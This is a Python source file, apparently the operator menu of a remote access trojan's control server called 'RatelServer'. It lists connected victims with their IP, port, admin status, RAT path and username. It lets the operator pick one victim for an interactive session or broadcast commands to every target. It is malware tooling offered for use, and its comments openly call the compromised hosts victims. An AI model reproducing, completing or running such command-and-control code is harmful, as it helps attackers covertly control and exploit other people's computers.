#from .handler import Handler
#from .session import Session
#from .management import Management
#from .management import CheckConn
#from .other import printColor



from colorama import Fore,Style
from prettytable import PrettyTable

from .handler import Handler
from .session import Session
from .management import Management
from .management import CheckConn
from .other import printColor
from .other import XOREncryption
from .sql import Sql
from .broadcast import Broadcast
from .other import NB_SESSION , NB_SOCKET , NB_IP , NB_PORT , NB_ALIVE , NB_ADMIN , NB_PATH , NB_USERNAME , NB_TOKEN,NB_SELECT ,SOCK_TIMEOUT

import time
import platform

if(platform.system() == "Linux"):
    import readline
else: #if windows
    import pyreadline
   



class Menu:
    RESET_COLOR = Style.RESET_ALL
    def help(self):
        printColor("help","""
 -h or --help : Displays all server commands.

 -t session_id  or --target session_id : Selects a session (client) to be able to execute commands (mod session). 

 -ls or --list : Displays all clients with their information.

 -cde or --connectionDisplayEnable : Activate the display of client information (Logoff and incoming connection).

 -cdd or --connectionDisplayDisable : Disables the display of client information (Logoff and incoming connection).
 
 --broadcast : Start a session with all targets (mod broadcast).
""")

    def changeStatusDisplay(self,true_or_false): 
        #this method enables or disables the display of connections on the terminal.
        Handler.status_connection_display= true_or_false
        if(true_or_false):
            printColor("information","[-] The connection display is active.\n")
        else:
            printColor("information","[-]The connection display is deactivated.\n")
    
    
    def printTarget(self):
        #Print all target.

        ptable = PrettyTable() #Ascii tables dynamic.
        ptable.field_names =["Session","IP","Port","Is he alive","Is he admin","Path RAT","Username"] #append title of row.
 
        for key in Handler.dict_conn.keys():
            #print("TETS BOOL_>",type(Handler.dict_conn[key][NB_ALIVE]),":",Handler.dict_conn[key][NB_ALIVE])
            ptable.add_row([key,Handler.dict_conn[key][NB_IP],Handler.dict_conn[key][NB_PORT],Handler.dict_conn[key][NB_ALIVE],Handler.dict_conn[key][NB_ADMIN],Handler.dict_conn[key][NB_PATH],Handler.dict_conn[key][NB_USERNAME]])

        print(Fore.GREEN,(ptable),Fore.BLUE)


    def selectTarget(self,target):    
        #Select target.
        #session, socket, ip, port, is_he_alive, is_he_admin, path_RAT, username, token
        '''
        When the server(menu) selects the victim, the victim is considered dead in Handler.dict_conn (False).
        This serves to avoid confusion when sending data. 
        '''

        if(target in Handler.dict_conn.keys()):
            printColor("information","[+] You are in the MOD SESSION")
            printColor("information","[+] Selected session: {}".format(Handler.dict_conn[target][NB_SESSION]))
            if(Handler.dict_conn[target][NB_ALIVE]):
                Handler.dict_conn[target][NB_SELECT] = True
                session = Session(Handler.dict_conn[target][NB_SOCKET],Handler.dict_conn[target][NB_IP],Handler.dict_conn[target][NB_PORT], target) #def __init__(self,socket,ip_client,port_client,session_nb): 
                session.main() 
                Handler.dict_conn[target][NB_SELECT] = False
                #print("Enable target...\n")
            else:
                printColor("information","[-] The target is currently offline.\n")
        else:
            printColor("information","[-] No target found. Please enter a valid target.\n")

        printColor("information","[?] You are in MOD_MAIN\n")

    def selectBroadcast(self):
        #Add to the start of the "MOD_ALL" command to tell the client to switch to MOD_ALL
        
        if len(Handler.dict_conn) != 0:
            
            Broadcast().main()

        else:
            printColor("error","[+] No connection is enabled.\n")
        
        printColor("information", "[-] You are in MOD_MAIN\n")


    def main(self):
        
        
        if(Handler.status_connection_display):
            printColor("help","[?] By default, the connection display is active.To avoid being generated, you can deactivate it with the -cdd command.")
        
        printColor("help","[?] Run -h or --help to list the available commands.\n")
        while True:
            try:
                choice = str(input("RatelServer> ")).split()
            except ValueError:
                break

            printColor("help","[?] Command execute: {}\n".format(choice))
            for i in range(0,len(choice)):

                if(choice[i] == "--help" or choice[i] == "-h"):
                    self.help()

                elif(choice[i] == "-t" or choice[i] =="--target"):
                    try:
                        self.selectTarget(int(choice[i+1])) #int car -t 10 <- 10 doit ^etre un int 
                    except IndexError:
                        printColor("information","[-] No target found. Please enter a valid target.\n")
                        
                elif(choice[i] == "-ls" or choice[i] == "--list"):
                    self.printTarget()
                
                elif(choice[i]== "--connectionDisplayDisable" or choice[i] == "-cdd"):
                    self.changeStatusDisplay(False)
                
                elif(choice[i]=="--connectionDisplayEnable" or choice[i] == "-cde"):
                    self.changeStatusDisplay(True)
                
                elif(choice[i] == "--broadcast"):
                    self.selectBroadcast()
                